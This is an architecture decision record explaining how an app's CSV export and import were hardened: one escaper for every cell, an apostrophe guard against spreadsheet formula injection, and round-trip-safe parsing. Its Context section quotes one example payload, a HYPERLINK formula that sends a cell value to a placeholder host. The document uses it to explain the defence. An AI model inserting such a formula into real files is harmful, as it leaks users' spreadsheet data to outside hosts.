# 11. The CSV file is a contract, and every cell in it is untrusted

**Status:** Accepted, implemented · **Date:** 2026-08-03 · **Issues:** #192, #208

Reference documentation lives in [../csv-format.md](../csv-format.md). This
record keeps the decision and the reasoning.

## Context

`escapeCSV` was correct. It quoted on `,`, `"` and `\n`, doubled embedded
quotes, and had done so since the export was written. The defect was that seven
of the ten cells in a detailed row never called it:

```ts
this.getCategoryName(category),        // raw
(t.tags ?? []).join('; '),             // raw
this.escapeCSV(t.description),         // escaped
```

Categories are user-editable and tags accept pasted text — the comma separator
only fires on keydown, and tags arriving from an AI import or a restored backup
are not filtered at all. So a tag reading `groceries, bulk` emitted a bare comma
mid-row, and the row carried eleven fields against a ten-field header. `Location`
shifted out and the trailing value was orphaned. The importer maps columns by
header position, so that row came back with a wrong amount, or with a place name
where an amount belonged.

The second half is not a formatting problem at all. No exported value was
neutralised against formula execution, and descriptions in this app come from
parsed receipts and imported bank statements — text the app did not write. A
description reading `=HYPERLINK("http://x/?d="&A1,"receipt")` opens in Excel or
Numbers as a live formula, with a cell reference in the query string.

And `parseCSV` split on `\n` before parsing quotes, so a note containing a
newline — which `escapeCSV` had correctly quoted on the way *out* — was torn
across two rows on the way back in. The export and the import disagreed about
what the file meant.

## Decision

**A CSV this app writes is a data-interchange contract, not a rendering.** Every
cell reaches the file through exactly one function, no cell is trusted to be
inert, and everything the detailed format writes reads back as what it was.

### One escaper with no bypass, rejecting a hardened `escapeCSV`

The cheap fix — and the one the issue proposed — is to widen `escapeCSV` in
place and add the missing calls. Rejected, because it leaves the defect's actual
shape untouched. The escaper was never wrong; the call sites were free to forget
it, and seven of them did. Widening it fixes today's ten columns and does
nothing about the eleventh.

The dialect now lives in `core/utils/csv.utils.ts`, and the only route to the
file is `toCsvRow`, which escapes every cell it is given. `exportToCSV` builds
raw values and never calls an escaper. A column added later cannot forget,
because there is nothing to remember.

The cost is a file and an import where there had been a private method. It buys
the ability to test the dialect as a dialect: roughly thirty synchronous
assertions against strings, where the same coverage through `ExportService`
would need a `TestBed` with five providers, a stubbed `fetch`, and a
`FileReader` per case, and could only assert substrings of a whole document.

### A uniform guard with a numeric carve-out, rejecting per-column classification

The obvious way to neutralise formulas is to guard the free-text columns and
leave the machine-generated ones alone. Rejected: that requires the caller to
classify each column correctly, which is precisely the shape that produced this
bug in the first place.

Instead the rule is uniform and the exception is a property of the **value**: a
cell is guarded unless it parses whole as a decimal number. This matters
concretely. `-45.00` guarded to `'-45.00` lands in a spreadsheet as text, and
`SUM()` over the Amount column silently returns 0 — breaking the single most
common thing anyone does with an exported ledger. Nothing that parses as a bare
number can be a payload; every real one needs a function call or a DDE
reference. `-1+1` is not a number, is a live formula, and is guarded.

### A conditional unguard, rejecting an unconditional strip

Guarding is only half a contract; the app has to undo its own guard on the way
back in. Stripping any leading apostrophe would corrupt a description reading
`'til payday` — including one in a foreign bank's CSV this app never wrote.

So the guard guards itself: export prefixes an apostrophe in front of a trigger
character *or another apostrophe*, and import removes a leading apostrophe only
when a trigger or another apostrophe follows it.

| stored | exported | re-imported |
|---|---|---|
| `=HYPERLINK(…)` | `'=HYPERLINK(…)` | `=HYPERLINK(…)` |
| `'til payday` | `''til payday` | `'til payday` |
| `-45.00` | `-45.00` | `-45.00` |

The one loss is a foreign cell literally reading `'=SUM(A1)`, which gives up its
apostrophe. That shape is vanishing, and Excel writing it means "the text
`=SUM(A1)`" — so the value that comes back is arguably the one intended.

### Period and Recurring in the detailed format only, rejecting both formats

#165 made a transaction's budget period persist; the CSV had no column for it,
so a CSV round-trip still dropped it — the one export path that did. Adding it
to the summary format as well was rejected. Summary already drops description,
note, tags and location, so a period would not make it round-trip; it would only
cost summary the at-a-glance shape it exists for. **Summary is lossy by design,
detailed is the format that round-trips**, and a spec pins the five columns so
that stays a decision rather than an accident.

`Recurring` landed in the same change deliberately. Any column addition breaks
the same three header assertions, and doing both at once costs one round of that
rather than two.

### Writing `\n` while reading `\n`, `\r\n` and `\r`

RFC 4180 says `\r\n`. The export keeps `\n`: every spreadsheet reads it, three
specs split on it, and changing it is orthogonal to both issues. The importer
accepts all three terminators, because foreign bank exports use all three.
Write conservatively, read liberally — stated in the module doc so the asymmetry
does not read as an oversight.

## Things that only became apparent while building

**The `.trim()` had to become conditional, and both halves are load-bearing.**
Dropping it entirely breaks real bank CSVs, which write `Date, Description,
Amount` with a space after each comma; `parseAmount` and `parseDate` trim
internally, so the damage would land on `description` alone, silently. Keeping it
unconditionally defeats the round trip this record is about: a cell beginning
with a tab is guarded, quoted, unguarded — and then trimmed back to nothing. So
unquoted fields are trimmed and quoted fields are returned byte-exact.

**`findColumn` matches by substring, which makes validation load-bearing rather
than defensive.** A bank statement carrying a `Statement Period` column matches
the new `period` probe, with a cell reading something like `2024-01 to 2024-02`.
Validating against the three known periods is what keeps that harmless, so it has
its own spec at exactly that case. For the same reason the probe list is
`['period']` and not `['period', 'budget period']`: `findColumn` returns on the
first probe matching any header, so a second entry containing the first is
unreachable, and a dead probe is worse than no probe.

**One of the tests being replaced had never run.** `'should include headers in
CSV'` took no `done` and awaited nothing, so its five assertions were evaluated
after the spec had already passed. It is now `async`/`await` and asserts the
whole header, which is how the new columns are pinned.

**Assertions on the end of a line are what broke.** Two specs asserted
`endsWith('Note,Tags,Location')` and `endsWith(',"Aoyama, Market"')`. Appending a
column invalidated both — not because the behaviour changed, but because they
had pinned a position rather than a cell. They now locate the column by header
name and assert the cell, which is also why they will survive the next addition.

## Known gaps

The AI-import path drops period and recurrence structurally, not accidentally:
`AiImportService.importFromCSV` maps rows onto `ExtractedTransaction`, which has
no field for either. Only the Settings → Import CSV path carries them. Closing
that means widening `ExtractedTransaction`, which is a change to the AI contract
and belongs with it, not here.

The apostrophe guard reliably stops *evaluation* in Excel, Numbers and Sheets,
but whether the apostrophe is *displayed* varies by application and version.
That variance is exactly why the importer strips it rather than trusting the
reader to hide it — but a user who opens an export, edits it in a spreadsheet
that shows the guard, and saves it back will have the apostrophe as literal text.

Nothing enforces that a column added to the writer also gets a probe on the
importer. The pre-change-header spec catches a file getting *wider*; it would not
catch a column written but never read — which is the defect #208 itself was, and
which `Category` still is. `parseCSV` has no `category` probe, so every imported
row takes the catch-all category no matter what the file says. Closing that means
matching a translated display name back to a category id, across locales and
against user-renamed categories, which is a different problem from CSV syntax and
was deliberately not started here. It is recorded in
[../csv-format.md](../csv-format.md) as the reason a CSV is not a backup.
